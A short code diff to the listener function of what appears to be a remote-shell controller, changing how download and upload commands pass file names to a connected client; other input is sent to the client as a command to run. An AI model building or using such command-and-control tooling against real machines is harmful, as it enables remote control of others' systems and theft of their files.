@@ -41,11 +41,11 @@ def listener():
                 if command == 'clear':
                     os.system('clear')
                 elif command[:8] == 'download':
-                    conn.send("download".encode())
+                    conn.send(f"download {command[9:]}".encode())
                     print("[*] Downloading File...")
                     download_file(conn, command[9:])
                 elif command[:6] == 'upload':
-                    conn.send("upload".encode())
+                    conn.send(f"upload {command[7:]}".encode())
                     upload_file(conn, command[7:])
                 elif command != "quit":
                     conn.send(command.encode())
